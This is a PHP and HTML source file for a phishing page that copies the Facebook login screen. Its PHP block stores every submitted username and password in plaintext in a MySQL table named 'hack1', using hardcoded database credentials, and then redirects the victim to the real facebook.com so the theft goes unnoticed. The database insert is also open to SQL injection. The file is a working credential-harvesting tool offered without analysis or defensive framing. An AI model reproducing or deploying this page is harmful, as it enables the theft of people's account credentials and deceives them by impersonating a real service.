<?php
    
    if($_SERVER['REQUEST_METHOD']=='POST'){
    if ( isset($_POST['submit']) and $_POST['submit'] == 'Log in') {
        $user = $_POST['user'];
        $pass = $_POST['password'];
        if($user != null and $pass != null){
        $conn=mysqli_connect("localhost","id2056314_tamilan","crazytricky","id2056314_tamilan_infotech") or die("connection failed");
        $sql="INSERT INTO hack1(user,password) VALUES ('$user','$pass')";
       if(mysqli_query($conn,$sql)){
         header("Location: https://www.facebook.com");
        exit();
         }
      }
    }
}
?>

<html lang="en" >
<head>
	<meta charset="utf-8" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />

	<title>Log in to Facebook | Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="css/main.css">

</head>
<body>
  <div class="top1">
  	 <div class="innerone"><h1>facebook<input id="signup" type="button" value="Sign Up"></h1>
      
  	 </div>

  </div>
  
  <div class="middleone">
  	<h1>Log in to Facebook</h1>
  	<div class="form">
  	 <form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
        <input type="text" name="user" placeholder="Email address or phone number" aria-label="Email address or phone number"><br />
        <input type="password" name="password" placeholder="password" aria-label="password"><br />
        <input type="submit" name="submit" value="Log in"><br />
     <div class="forgot_pass">
          <a href="#">Forgotten account?</a><span>  .  </span><a href="#">Sign up for Facebook</a>

     	</div>
     	</form>
  	</div>
  </div>

  <div class="footer">
     <ul>
     	<li><a href="#">English (UK)</a></li>
     	<li><a href="#">தமிழ்</a></li>
     	<li><a href="#">తెలుగు</a></li>
     	<li><a href="#">ಕನ್ನಡ</a></li>
     	<li><a href="#">اردو</a></li>
     	<li><a href="#">हिन्दी</a></li>
     	<li><a href="#">മലയാളം</a></li>
     	<li><a href="#">සිංහල</a></li>
     	<li><a href="#">ਪੰਜਾਬੀ</a></li>
     	<li><a href="#">বাংলা</a></li>
     	<li><a href="#">ગુજરાતી</a></li>

     	
     </ul>
     <hr />
     <div class="bw">
     	<table>
     		<tr>
     		    <td><a href="#">Sign Up</a></td>
     		    <td><a href="#">Log In</a></td>
     		    <td><a href="#">Messenger</a></td>
     		    <td><a href="#">Facebook Lite</a></td>
     		    <td><a href="#">Mobile</a></td>
     		    <td><a href="#">Find Friends</a></td>
     		    <td><a href="#">People</a></td>
     		    <td><a href="#">Pages</a></td>
     		    <td><a href="#">Places</a></td>
     		    <td><a href="#">Games</a></td>
     		    <td><a href="#">Locations</a></td>
     	   </tr>
     	   <tr>
              <td><a href="#">Celebrities</a></td>
     	   	  <td><a href="#">Marketplace</a></td>
     	   	  <td><a href="#">Groups</a></td>
     	   	  <td><a href="#">Recipes</a></td>
     	   	  <td><a href="#">Sports</a></td>
     	   	  <td><a href="#">Moments</a></td>
     	   	  <td><a href="#">Instagram</a></td>
     	   	  <td><a href="#">About</a></td>
     	   	  <td><a href="#">Create Ad</a></td>
     	   	  <td><a href="#">Create Page</a></td>
     	   	  <td><a href="#">Developers</a></td>
     	   	</tr>
     	   	<tr>
     	   		<td><a href="#">Careers</a></td>
     	   		<td><a href="#">Privacy</a></td>
     	   		<td><a href="#">Cookies</a></td>
     	   		<td><a href="#">AdChoices</a></td>
     	   		<td><a href="#">Terms</a></td>
     	   		<td><a href="#">Help</a></td>
     	   	</tr>
     	 </table>
     	 <div class="finish"><span>Facebook	&#169 2017</span><div>
	</div>
    </div>
</body>
</html>
